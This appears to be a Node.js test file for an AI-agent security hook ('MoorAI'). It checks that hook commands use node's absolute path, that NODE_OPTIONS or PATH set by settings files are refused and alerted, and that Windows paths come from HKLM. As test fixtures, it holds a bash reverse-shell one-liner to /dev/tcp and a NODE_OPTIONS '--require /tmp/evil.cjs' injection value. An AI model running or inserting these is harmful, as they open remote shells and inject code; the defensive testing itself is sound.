// Trust-anchor design phase 1C (hook command and environment) and the Windows machine directory (1A).
//
//   node --test --import ./test/hermetic-env.mjs test/hook-env-hardening.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname, isAbsolute } from "node:path";
import { fileURLToPath } from "node:url";
import http from "node:http";
import { parseRegValue, windowsDirs, machinePath, PROFILE_LIST_KEY } from "../cli/machine-dir.mjs";
import { agentPosture } from "../cli/agent-posture.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const HOOK = join(ROOT, "cli", "moorai-hook.mjs");
const SHELL = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1";

// ---- hookEntry: node by absolute path ----

test("install: every registered hook command names node by absolute path (process.execPath), not a bare `node` from PATH", () => {
  const home = mkdtempSync(join(tmpdir(), "moorai-hookentry-"));
  try {
    const r = spawnSync(process.execPath, [HOOK, "install"], { env: { ...process.env, HOME: home, USERPROFILE: home }, encoding: "utf8" });
    assert.equal(r.status, 0, r.stderr);
    const s = JSON.parse(readFileSync(join(home, ".claude", "settings.json"), "utf8"));
    const cmds = Object.values(s.hooks).flat().flatMap((e) => e.hooks.map((h) => h.command));
    assert.ok(cmds.length > 5);
    for (const c of cmds) {
      const m = /^"((?:[^"\\]|\\.)*)"\s+"((?:[^"\\]|\\.)*)"$/.exec(c);
      assert.ok(m, `not "<node>" "<hook>": ${c}`);
      const exe = JSON.parse(`"${m[1]}"`);
      assert.ok(isAbsolute(exe), `node is not absolute: ${exe}`);
      assert.equal(exe, process.execPath);
      assert.equal(JSON.parse(`"${m[2]}"`), HOOK);
    }
  } finally { rmTree(home); }
});

test("converge: a pre-1.13 entry with a bare `node` is rewritten to the absolute command on the next hook call", () => {
  const home = mkdtempSync(join(tmpdir(), "moorai-converge-"));
  try {
    spawnSync(process.execPath, [HOOK, "install"], { env: { ...process.env, HOME: home, USERPROFILE: home } });
    const p = join(home, ".claude", "settings.json");
    const s = JSON.parse(readFileSync(p, "utf8"));
    for (const list of Object.values(s.hooks)) for (const e of list) for (const h of e.hooks) h.command = `node ${JSON.stringify(HOOK)}`;
    writeFileSync(p, JSON.stringify(s));
    spawnSync(process.execPath, [HOOK], { env: { ...process.env, HOME: home, USERPROFILE: home }, input: JSON.stringify({ hook_event_name: "PreCompact", trigger: "manual" }) });
    const after = Object.values(JSON.parse(readFileSync(p, "utf8")).hooks).flat().flatMap((e) => e.hooks.map((h) => h.command));
    assert.ok(after.every((c) => c.startsWith(JSON.stringify(process.execPath))), after.join("\n"));
  } finally { rmTree(home); }
});

// ---- settings-file env: NODE_OPTIONS / NODE_PATH / PATH / ProgramData ----

async function consoleServer() {
  const alerts = [];
  const srv = http.createServer((req, res) => {
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      if (req.method === "POST") { try { if (req.url === "/api/alerts") alerts.push(JSON.parse(body)); } catch { /* ignore */ } res.writeHead(201); return res.end("{}"); }
      if (req.url.startsWith("/api/policy/pubkey")) { res.writeHead(404); return res.end(); }
      res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify({ captureTier: "content-free" }));
    });
  });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  return { url: `http://127.0.0.1:${srv.address().port}`, alerts, close: () => new Promise((r) => srv.close(r)) };
}
function runHook(home, env = {}) {
  const proj = join(home, "proj");
  const payload = { hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: SHELL }, session_id: "envh", cwd: proj };
  return new Promise((res) => {
    const c = spawn(process.execPath, [HOOK], { cwd: proj, env: { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home, CLAUDE_PROJECT_DIR: proj, XDG_CONFIG_HOME: join(home, ".config"), XDG_STATE_HOME: join(home, ".local", "state"), ...env } });
    let out = "", err = "";
    c.stdout.on("data", (d) => (out += d)); c.stderr.on("data", (d) => (err += d));
    c.on("close", (status) => res({ status, out, err }));
    c.stdin.end(JSON.stringify(payload));
  });
}
function sandbox(url, projectEnv) {
  const home = mkdtempSync(join(tmpdir(), "moorai-envh-"));
  mkdirSync(join(home, ".moorai"), { recursive: true });
  mkdirSync(join(home, "proj", ".claude"), { recursive: true });
  writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify({ serverUrl: url, tenant: "acme", installToken: "tok-envh" }));
  if (projectEnv) writeFileSync(join(home, "proj", ".claude", "settings.json"), JSON.stringify({ env: projectEnv }));
  return home;
}
const REFUSAL = "Policy: environment set by a settings file refused";

test("a project settings file that sets NODE_OPTIONS for the hook raises the refusal alert, names only", async () => {
  const c = await consoleServer();
  const home = sandbox(c.url, { NODE_OPTIONS: "--require /tmp/evil.cjs", FOO: "bar" });
  try {
    const r = await runHook(home);
    assert.equal(r.status, 0, r.err);
    const a = c.alerts.find((x) => x.category === REFUSAL);
    assert.ok(a, `no refusal alert: ${JSON.stringify(c.alerts.map((x) => x.category))}`);
    assert.deepEqual(a.refusedEnv, ["NODE_OPTIONS"]);
    assert.equal(a.riskLevel, "Critical");
    assert.ok(!JSON.stringify(a).includes("evil.cjs"), "the value never leaves the device");
  } finally { await c.close(); rmTree(home); }
});

test("PATH set by a settings file is reported (High); PATH merely inherited from the launcher is not", async () => {
  const c = await consoleServer();
  const set = sandbox(c.url, { PATH: "/tmp/shims:/usr/bin:/bin" });
  const inherited = sandbox(c.url, null);
  try {
    await runHook(set);
    const a = c.alerts.find((x) => x.category === REFUSAL);
    assert.ok(a, JSON.stringify(c.alerts.map((x) => x.category)));
    assert.deepEqual(a.refusedEnv, ["PATH"]);
    assert.equal(a.riskLevel, "High");
    c.alerts.length = 0;
    await runHook(inherited, { PATH: `/opt/custom/bin:${process.env.PATH}` });
    assert.equal(c.alerts.filter((x) => x.category === REFUSAL).length, 0, "an inherited PATH is not a finding");
  } finally { await c.close(); rmTree(set); rmTree(inherited); }
});

test("posture: a settings `env` block that sets a hook-process variable is the hookEnvOverride flag (Windows-style casing too)", () => {
  const home = mkdtempSync(join(tmpdir(), "moorai-envposture-"));
  try {
    mkdirSync(join(home, ".claude"), { recursive: true });
    mkdirSync(join(home, "proj", ".claude"), { recursive: true });
    writeFileSync(join(home, ".claude", "settings.json"), JSON.stringify({ hooks: {}, env: { Path: "C:\\shims" } }));
    writeFileSync(join(home, "proj", ".claude", "settings.json"), JSON.stringify({ env: { NODE_OPTIONS: "--require x" } }));
    const p = agentPosture({ home, cwd: join(home, "proj"), caller: "claude-code", managedSources: [], hookCheck: false, versions: false, containment: false });
    const cc = p.hosts.find((h) => h.host === "claude-code");
    assert.deepEqual(cc.flags.hookEnvOverride, ["project", "user"]);
  } finally { rmTree(home); }
});

// ---- the Windows machine directory: HKLM, never %ProgramData% ----

const REG_OUT = `\r\n${PROFILE_LIST_KEY}\r\n    ProgramData    REG_EXPAND_SZ    %SystemDrive%\\ProgramData\r\n\r\n`;

test("machine-dir: ProgramData comes from HKLM (reg.exe by absolute path), %SystemDrive% expanded from the system root, the env ignored", () => {
  const calls = [];
  const d = windowsDirs({ exists: () => true, run: (exe, args) => { calls.push([exe, ...args]); return REG_OUT; }, env: { ProgramData: "C:\\Users\\agent\\fake", SystemRoot: "C:\\Users\\agent\\win" } });
  assert.deepEqual(d, { systemRoot: "C:\\Windows", programData: "C:\\ProgramData", source: "fixed", programDataSource: "hklm" });
  assert.deepEqual(calls, [["C:\\Windows\\System32\\reg.exe", "query", PROFILE_LIST_KEY, "/v", "ProgramData"]]);
  assert.equal(machinePath("policy.pub", "win32", d), "C:\\ProgramData\\MoorAI\\policy.pub");
  assert.equal(machinePath("policy.pub", "linux"), "/etc/moorai/policy.pub");
  assert.equal(parseRegValue(REG_OUT, "programdata"), "%SystemDrive%\\ProgramData");
});

test("machine-dir: reg.exe failing or printing junk falls back to <SystemDrive>\\ProgramData, never to the env", () => {
  const env = { ProgramData: "C:\\Users\\agent\\fake" };
  assert.equal(windowsDirs({ exists: () => true, run: () => { throw new Error("no reg"); }, env }).programData, "C:\\ProgramData");
  assert.equal(windowsDirs({ exists: () => true, run: () => "    ProgramData    REG_EXPAND_SZ    %APPDATA%\\x\r\n", env }).programData, "C:\\ProgramData");
  const relocated = windowsDirs({ exists: () => true, run: () => "    ProgramData    REG_SZ    D:\\Data\r\n", env });
  assert.equal(relocated.programData, "D:\\Data", "an admin-relocated ProgramData is honoured");
});

// Windows CI (windows-js): the real reg.exe and a hostile %ProgramData% in the hook's environment.
test("Windows: with ProgramData pointing at a user directory holding planted anchors, the hook's anchor paths stay under the HKLM ProgramData", { skip: process.platform !== "win32" && "Windows only" }, () => {
  const fake = mkdtempSync(join(tmpdir(), "moorai-pd-"));
  try {
    mkdirSync(join(fake, "MoorAI"), { recursive: true });
    for (const f of ["policy.pub", "exceptions.json", "config.json", "breakglass.pub"]) writeFileSync(join(fake, "MoorAI", f), "planted");
    const probe = `
      const md = await import(${JSON.stringify(new URL("../cli/machine-dir.mjs", import.meta.url).href)});
      const hc = await import(${JSON.stringify(new URL("../cli/hook-core.mjs", import.meta.url).href)});
      const sm = await import(${JSON.stringify(new URL("../cli/server-mode.mjs", import.meta.url).href)});
      const ex = await import(${JSON.stringify(new URL("../cli/exceptions.mjs", import.meta.url).href)});
      console.log(JSON.stringify({ dirs: md.windowsDirsCached(), anchor: hc.policyAnchorPath(), posture: hc.systemPosturePath(), config: sm.systemConfigPath(), exceptions: ex.EXCEPTIONS_FILE }));`;
    const r = spawnSync(process.execPath, ["--input-type=module", "-e", probe], { env: { ...process.env, ProgramData: fake, PROGRAMDATA: fake }, encoding: "utf8" });
    assert.equal(r.status, 0, r.stderr);
    const got = JSON.parse(r.stdout.trim());
    assert.equal(got.dirs.programDataSource, "hklm", JSON.stringify(got));
    for (const p of [got.anchor, got.posture, got.config, got.exceptions]) {
      assert.ok(!p.toLowerCase().startsWith(fake.toLowerCase()), `${p} was built from %ProgramData%`);
      assert.ok(p.toLowerCase().startsWith(`${got.dirs.programData.toLowerCase()}\\moorai\\`), p);
    }
  } finally { rmTree(fake); }
});
